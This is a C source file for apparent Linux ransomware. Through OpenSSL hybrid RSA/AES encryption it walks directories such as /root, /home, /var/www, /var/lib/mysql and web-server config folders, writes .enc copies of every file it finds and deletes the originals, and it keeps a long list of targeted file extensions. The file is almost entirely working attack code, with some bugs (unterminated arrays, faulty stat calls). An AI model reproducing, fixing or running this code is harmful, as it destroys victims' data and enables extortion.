#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/err.h>

#include <arpa/inet.h> /* For htonl() */

char *public_key_path = NULL;

const char *encfiles_ext[] = {
    ".php", ".html", ".tar", ".gz", ".sql",
    ".js", ".css", ".txt", ".jsp", ".do",
    ".pdf", ".tgz", ".war", ".jar", ".java",
    ".class", ".ruby", ".py", ".rar", ".zip",
    ".db", ".7z", ".doc", ".ppt", ".hwp",
    ".xls", ".properties", ".xml", ".jpg", ".jpeg",
    ".png", ".gif", ".mov", ".bmp", ".avi",
    ".mp3", ".mp4", ".wma", ".aac", ".wav",
    ".pem", ".pub", ".docx", ".apk", ".exe",
    ".dll", ".tpl", ".pds", ".asp", ".phtml",
    ".aspx", ".csv", ".json", ".bak", ".backup",
    ".git", ".svn", ".pl", ".md"
};


/*
const char *exclude_dir[] = {
    "/dev", "/boot", "/usr/bin", "/etc", "/bin",
    "/usr/lib", "/usr/lib64", "/proc", "/sys",
    "/srv", "/run", "/mnt", "/opt", "/usr/include",
    "/usr/share", "/usr/src/kernels"+
};
*/

const char *enc_dirs[] = {
    "/root", "/usr/sbin", "/home", "/var/log", "/var/lib/mysql",
    "/var/spool", "/var/www", "/etc/nginx", "/etc/apache2", "/etc/httpd"
};

/* encryption */
int EncWithEVP_SEAL(FILE *in_file, FILE *out_file)
{
    int retval = 0;
    RSA *rsa_pkey = NULL; //RSA_new();
    EVP_PKEY *pkey = EVP_PKEY_new();
    EVP_CIPHER_CTX ctx;
    unsigned char buffer[4096];
    unsigned char buffer_out[4096 + EVP_MAX_IV_LENGTH];
    size_t len;
    int len_out;
    unsigned char *ek = NULL;
    int eklen;
    uint32_t eklen_n;
    unsigned char iv[EVP_MAX_IV_LENGTH];

    FILE *rsa_pkey_file;
    rsa_pkey_file = fopen(public_key_path, "rb");
    if(!rsa_pkey_file){
        perror(public_key_path);
        fprintf(stderr, "[Error] Loading RSA Public Key File.\n");
        exit(2);
    }

    if (!PEM_read_RSA_PUBKEY(rsa_pkey_file, &rsa_pkey, NULL, NULL))
    {
        /* print file path from FILE pointer */
        int MAXSIZE = 0xFFF;
        char proclnk[0xFFF];
        char filename[0xFFF];
        int fno;
        ssize_t r;

        fno = fileno(in_file);
        sprintf(proclnk, "/proc/self/fd/%d", fno);
        r = readlink(proclnk, filename, MAXSIZE);
        filename[r] = '\0';

        fprintf(stderr, "Error loading RSA Public Key File.[%s]\n", filename);
        ERR_print_errors_fp(stderr);
        retval = 2;
        goto out;
    }

    if (!EVP_PKEY_assign_RSA(pkey, rsa_pkey))
    {
        fprintf(stderr, "EVP_PKEY_assign_RSA: failed.\n");
        retval = 3;
        goto out;
    }

    EVP_CIPHER_CTX_init(&ctx);
    ek = malloc(EVP_PKEY_size(pkey));

    if (!EVP_SealInit(&ctx, EVP_aes_128_cbc(), &ek, &eklen, iv, &pkey, 1))
    {
        fprintf(stderr, "EVP_SealInit: failed.\n");
        retval = 3;
        goto out_free;
    }

    /* First we write out the encrypted key length, then the encrypted key,
     * then the iv (the IV length is fixed by the cipher we have chosen).
     */

    eklen_n = htonl(eklen);
    if (fwrite(&eklen_n, sizeof eklen_n, 1, out_file) != 1)
    {
        retval = 5;
        goto out_free;
    }
    if (fwrite(ek, eklen, 1, out_file) != 1)
    {
        retval = 5;
        goto out_free;
    }
    if (fwrite(iv, EVP_CIPHER_iv_length(EVP_aes_128_cbc()), 1, out_file) != 1)
    {
        retval = 5;
        goto out_free;
    }

    /* Now we process the input file and write the encrypted data to the
     * output file. */

    while ((len = fread(buffer, 1, sizeof buffer, in_file)) > 0)
    {
        if (!EVP_SealUpdate(&ctx, buffer_out, &len_out, buffer, len))
        {
            fprintf(stderr, "EVP_SealUpdate: failed.\n");
            retval = 3;
            goto out_free;
        }

        if (fwrite(buffer_out, len_out, 1, out_file) != 1)
        {
            retval = 5;
            goto out_free;
        }
    }

    if (ferror(in_file))
    {
        retval = 4;
        goto out_free;
    }

    if (!EVP_SealFinal(&ctx, buffer_out, &len_out))
    {
        fprintf(stderr, "EVP_SealFinal: failed.\n");
        retval = 3;
        goto out_free;
    }

    if (fwrite(buffer_out, len_out, 1, out_file) != 1)
    {
        retval = 5;
        goto out_free;
    }

    out_free:
    EVP_PKEY_free(pkey);
    //RSA_free(rsa_pkey);
    free(ek);

    out:
    fclose(rsa_pkey_file);
    return retval;
}

int is_regular_file(const char *path)
{
    struct stat path_stat;
    stat(path, &path_stat);
    return S_ISREG(path_stat.st_mode);
}

void diveindir(const char *name, int just_ext)
{
    DIR *dir;
    struct dirent *d_entry;
    struct stat s_stat;
    int i = 0;

    if( !(dir = opendir(name)) ){
        return;
    }
    if( !(d_entry = readdir(dir)) ){
        return;
    }

    do{
        stat(d_entry->d_name, &s_stat);
        if(S_ISDIR(s_stat.st_mode)){
            char filepath[2048] = {0,};
            char encfile[2048] = {0,};
            FILE *f_ori;
            FILE *f_enc;

            if(strcmp(d_entry->d_name, ".") == 0 || strcmp(d_entry->d_name, "..") == 0){
                continue;
            }

            int len = snprintf(filepath, sizeof(filepath)-1, "%s/%s", name, d_entry->d_name);
            filepath[len] = 0;
            int enclen = snprintf(encfile, sizeof(encfile)-1, "%s.enc", filepath);
            encfile[enclen] = 0;

            if(strstr(filepath, ".enc")){
                continue;
            }

            f_ori = fopen(filepath, "rb");
            if(f_ori == NULL){
                continue;
            }
            f_enc = fopen(encfile, "wb");
            if(f_enc == NULL){
                continue;
            }

            if(is_regular_file(filepath)){
                EncWithEVP_SEAL(f_ori, f_enc);
            }

            fclose(f_ori);
            fclose(f_enc);

            // unlink or remove orifile
            unlink(filepath);

            diveindir(filepath, just_ext);
        }
        else{
            int j;
            char filepath[2048] = {0,};
            char encfile[2048] = {0,};
            FILE *f_ori;
            FILE *f_enc;

            int len = snprintf(filepath, sizeof(filepath)-1, "%s/%s", name, d_entry->d_name);
            filepath[len] = 0;
            int enclen = snprintf(encfile, sizeof(encfile)-1, "%s.enc", filepath);
            encfile[enclen] = 0;

            if(strstr(filepath, ".enc")){
                continue;
            }

            f_ori = fopen(filepath, "rb");
            if(f_ori == NULL){
                continue;
            }
            f_enc = fopen(encfile, "wb");
            if(f_enc == NULL){
                continue;
            }

            /* check extension */
            if(just_ext){
                for(j = 0; encfiles_ext[j] != NULL; j++){
                    if(strstr(d_entry->d_name, encfiles_ext[j])){
                        EncWithEVP_SEAL(f_ori, f_enc);
                    }
                }
            }else
            {
                EncWithEVP_SEAL(f_ori, f_enc);
            }
            fclose(f_ori);
            fclose(f_enc);

            // unlink or remove orifile
            unlink(filepath);
        }
    }while(d_entry = readdir(dir));
    closedir(dir);
}

int main(int argc, char *argv[])
{
    int i;

    if(argc < 2){
        fprintf(stderr, "Usage: %s <RSA Public Key File>\n", argv[0]);
        exit(1);
    }

    public_key_path = argv[1];

    for(i = 0; enc_dirs[i] != NULL; i++){
        diveindir(enc_dirs[i], 0);
    }

    // find all matched extension and encrypt
    //diveindir("/root/test", 1);

    return 0;
}
